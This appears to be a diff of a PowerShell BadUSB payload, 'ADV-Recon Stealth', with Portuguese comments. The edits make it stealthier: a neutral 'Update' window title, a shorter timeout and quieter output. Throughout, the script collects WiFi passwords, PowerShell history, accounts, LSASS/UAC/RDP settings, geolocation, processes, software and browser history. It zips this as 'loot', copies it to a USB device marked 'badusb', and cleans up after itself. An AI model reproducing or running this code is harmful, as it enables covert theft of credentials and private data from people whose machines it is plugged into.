@@ -1,17 +1,15 @@
 <#
 .SYNOPSIS
-    ADV-Recon Stealth — Red Team Edition v3
-    Comandos curtos. Robusto contra truncagem.
-    Output: OK ou NOK. Cleanup total sempre.
+    ADV-Recon Stealth v4 — Discreto
+    Recon rapido. Timeout 15s. Output: contador discreto + OK/NOK.
+    Cleanup total sempre.
 #>
 
 ############################################################################################################################################################
-# JANELA: minimizada
+# JANELA: titulo neutro, fonte pequena
 ############################################################################################################################################################
 
-$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int h, int s);'
-Add-Type -Name W -Member $i -Namespace N
-[N.W]::ShowWindow(([Diagnostics.Process]::GetCurrentProcess()|Get-Process).MainWindowHandle, 6)
+$host.UI.RawUI.WindowTitle = 'Update'
 
 ############################################################################################################################################################
 # LOG INTERNO
@@ -20,14 +18,14 @@ Add-Type -Name W -Member $i -Namespace N
 $Global:Log = @()
 function L($m){$Global:Log+=("[{0:HH:mm:ss}] {1}" -f (Get-Date),$m)}
 
-L 'ADV-Recon Stealth v3 iniciado'
+L 'ADV-Recon Stealth v4 iniciado'
 L ('User: '+$env:USERNAME+' | PC: '+$env:COMPUTERNAME)
 
 ############################################################################################################################################################
 # CONFIG
 ############################################################################################################################################################
 
-$Timeout   = 30
+$Timeout   = 15
 $OutFolder = 'loot'
 $Marker    = 'badusb'
 $IgnoreIDs = @('C:','D:')
@@ -41,7 +39,7 @@ $ZP  = $env:TEMP+'\'+$Zip
 mkdir $WD -Force|Out-Null
 
 ############################################################################################################################################################
-# ETAPA 1: Tree
+# RECON (silencioso)
 ############################################################################################################################################################
 L 'ETAPA 1: Tree'
 try{
@@ -53,9 +51,6 @@ try{
     L ('OK: Tree ('+$tsz+' bytes)')
 }catch{L 'FAIL: Tree'}
 
-############################################################################################################################################################
-# ETAPA 2: PS History
-############################################################################################################################################################
 L 'ETAPA 2: PS History'
 try{
     $src = $env:APPDATA+'\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
@@ -63,9 +58,6 @@ try{
     L 'OK: PS History'
 }catch{L 'FAIL: PS History'}
 
-############################################################################################################################################################
-# ETAPA 3: User data
-############################################################################################################################################################
 L 'ETAPA 3: User data'
 try{$fn=(Get-LocalUser $env:USERNAME).FullName}catch{$fn=$env:USERNAME}
 try{$em=(Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName}catch{$em='N/D'}
@@ -79,15 +71,9 @@ try{
     L 'OK: Geo'
 }catch{$la='N/D';$lo='N/D';$gs='Err';L 'FAIL: Geo'}
 
-############################################################################################################################################################
-# ETAPA 4: Local users
-############################################################################################################################################################
 L 'ETAPA 4: Local users'
 try{$lu=Get-WmiObject Win32_UserAccount|ft Caption,Domain,Name,FullName,SID|Out-String;L 'OK: Users'}catch{$lu='Err';L 'FAIL: Users'}
 
-############################################################################################################################################################
-# ETAPA 5: UAC / LSASS / RDP
-############################################################################################################################################################
 L 'ETAPA 5: UAC/LSASS/RDP'
 try{
     $rk = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
@@ -106,9 +92,6 @@ try{
 }catch{$rd='Err'}
 L 'OK: UAC/LSASS/RDP'
 
-############################################################################################################################################################
-# ETAPA 6: Network
-############################################################################################################################################################
 L 'ETAPA 6: Network'
 try{$pu=(iwr ipinfo.io/ip -UseBasicParsing -TimeoutSec 3).Content.Trim()}catch{$pu='Err'}
 try{
@@ -121,12 +104,7 @@ try{
 }catch{$mc='Err'}
 L 'OK: Network'
 
-############################################################################################################################################################
-# ETAPA 7: WiFi (REESCRITO — comandos curtos)
-############################################################################################################################################################
 L 'ETAPA 7: WiFi'
-
-# Redes proximas
 try{
     $nwRaw = netsh wlan show networks mode=Bssid 2>$null
     $nwLines = $nwRaw | Where-Object {$_ -like 'SSID*' -or $_ -like '*Authentication*' -or $_ -like '*Encryption*'}
@@ -134,8 +112,6 @@ try{
     if(!$nw){$nw='None'}
     L 'OK: Nearby WiFi'
 }catch{$nw='Err';L 'FAIL: Nearby WiFi'}
-
-# Perfis WiFi com senhas
 try{
     $profRaw = netsh wlan show profiles 2>$null
     $profNames = @()
@@ -164,9 +140,6 @@ try{
     L ('OK: WiFi Profiles ('+$wpOut.Count+')')
 }catch{$wp='Err';L 'FAIL: WiFi Profiles'}
 
-############################################################################################################################################################
-# ETAPA 8: System
-############################################################################################################################################################
 L 'ETAPA 8: System'
 try{$cs=Get-CimInstance CIM_ComputerSystem;$cn=$cs.Name;$cm=$cs.Model;$cf=$cs.Manufacturer}catch{$cn=$env:COMPUTERNAME;$cm='?';$cf='?'}
 try{$bios=Get-CimInstance CIM_BIOSElement|Out-String}catch{$bios='Err'}
@@ -178,9 +151,6 @@ try{$rm=gwmi Win32_PhysicalMemory|select DeviceLocator,@{N='Capacity';E={'{0:N1}
 try{$vc=gwmi Win32_VideoController|ft Name,VideoProcessor,DriverVersion,CurrentHorizontalResolution,CurrentVerticalResolution|Out-String -w 250}catch{$vc='Err'}
 L 'OK: System'
 
-############################################################################################################################################################
-# ETAPA 9: Disks / Devices
-############################################################################################################################################################
 L 'ETAPA 9: Disks/Devices'
 try{
     $dt=@{2='Rem';3='Fix';4='Net';5='CD'}
@@ -190,9 +160,6 @@ try{$cmdev=gwmi Win32_USBControllerDevice -ea 0|%{[Wmi]($_.Dependent)}|Select Na
 try{$na=gwmi Win32_NetworkAdapterConfiguration|?{$_.MACAddress -notlike $null}|select Index,Description,IPAddress,DefaultIPGateway,MACAddress|ft|Out-String -w 250}catch{$na='Err'}
 L 'OK: Disks/Devices'
 
-############################################################################################################################################################
-# ETAPA 10: Processes / Connections / Services
-############################################################################################################################################################
 L 'ETAPA 10: Procs/Conns/Svcs'
 try{$pr=gwmi win32_process|select Handle,ProcessName,ExecutablePath,CommandLine|sort ProcessName|ft Handle,ProcessName,ExecutablePath,CommandLine|Out-String -w 250}catch{$pr='Err'}
 try{
@@ -206,17 +173,11 @@ try{
 try{$sv=gwmi win32_service|select State,Name,DisplayName,PathName,@{N='Srt';E={$_.State+$_.Name}}|sort Srt|ft State,Name,DisplayName,PathName|Out-String -w 250}catch{$sv='Err'}
 L 'OK: Procs/Conns/Svcs'
 
-############################################################################################################################################################
-# ETAPA 11: Software / Drivers
-############################################################################################################################################################
 L 'ETAPA 11: Software/Drivers'
 try{$sw=gp HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|?{$_.DisplayName -notlike $null}|Select DisplayName,DisplayVersion,Publisher,InstallDate|sort DisplayName|ft -Auto|Out-String -w 250}catch{$sw='Err'}
 try{$dr=gwmi Win32_PnPSignedDriver|?{$_.DeviceName -notlike $null}|select DeviceName,FriendlyName,DriverProviderName,DriverVersion|Out-String -w 250}catch{$dr='Err'}
 L 'OK: Software/Drivers'
 
-############################################################################################################################################################
-# ETAPA 12: Misc
-############################################################################################################################################################
 L 'ETAPA 12: Misc'
 try{
     $startDir = [Environment]::GetFolderPath('Startup')
@@ -228,11 +189,7 @@ try{$kl=klist sessions 2>$null;if(!$kl){$kl='Nenhuma'}}catch{$kl='Err'}
 try{$rf=ls $env:USERPROFILE -Recurse -File -ea 0|sort LastWriteTime -Desc|select -First 50 FullName,LastWriteTime|Out-String}catch{$rf='Err'}
 L 'OK: Misc'
 
-############################################################################################################################################################
-# ETAPA 13: Browser Data (comandos curtos, findstr nativo)
-############################################################################################################################################################
 L 'ETAPA 13: Browser data'
-
 $bl=$WD+'\BrowserData.txt'
 $rx='(http|https)://[\w\-\.]+(:\d+)?(/[\w\-\./\?%&=#]*)?'
 
@@ -250,27 +207,17 @@ function B($browser,$dtype,$path){
     }catch{}
 }
 
-# Chrome
 B chrome history   "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
 B chrome bookmarks "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-
-# Edge
 B edge history   "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
 B edge bookmarks "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
-
-# Firefox
 $ffprof = ls "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" -ea 0
 $ffprof = $ffprof | Select-Object -First 1
 if($ffprof){B firefox history $ffprof.FullName}
-
-# Opera
 B opera history   "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Default\History"
 B opera bookmarks "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Default\Bookmarks"
-
-# Brave
 B brave history   "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
 B brave bookmarks "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
-
 L 'OK: Browser data done'
 
 ############################################################################################################################################################
@@ -278,7 +225,7 @@ L 'OK: Browser data done'
 ############################################################################################################################################################
 L 'Compilando relatorio'
 $out=@"
-ADV-Recon Stealth v3
+ADV-Recon Stealth v4
 ===================
 
 Full Name: $fn
@@ -350,11 +297,8 @@ $out>($WD+'\computerData.txt')
 try{Compress-Archive $WD $ZP -Force;L ('ZIP: '+$ZP)}catch{L 'ZIP FAIL'}
 
 ############################################################################################################################################################
-# ESPERAR FLIPPER (30s)
+# ESPERAR FLIPPER (15s — contador discreto)
 ############################################################################################################################################################
-
-Write-Host ''
-Write-Host '[*] Wait 30s...' -ForegroundColor DarkGray
 
 $found=$null
 $t=0
@@ -383,7 +327,7 @@ while($t -lt $Timeout -and !$found){
 
   if(!$found){
     $r=$Timeout-$t
-    Write-Host ("`r  {0}s " -f $r) -NoNewline -ForegroundColor DarkGray
+    Write-Host ("`r" + $r) -NoNewline -ForegroundColor DarkGray
     Sleep 1
     $t++
   }
@@ -411,13 +355,14 @@ if($found){
 }
 
 ############################################################################################################################################################
-# OUTPUT FINAL
+# OUTPUT FINAL (discreto)
 ############################################################################################################################################################
 
+Write-Host "`r" -NoNewline
 if($ok){
-  Write-Host "`rOK   " -ForegroundColor Green -NoNewline
+  Write-Host 'OK' -ForegroundColor DarkGreen
 }else{
-  Write-Host "`rNOK  " -ForegroundColor Red -NoNewline
+  Write-Host 'NOK' -ForegroundColor DarkRed
 }
 Sleep 2
 Clear-Host
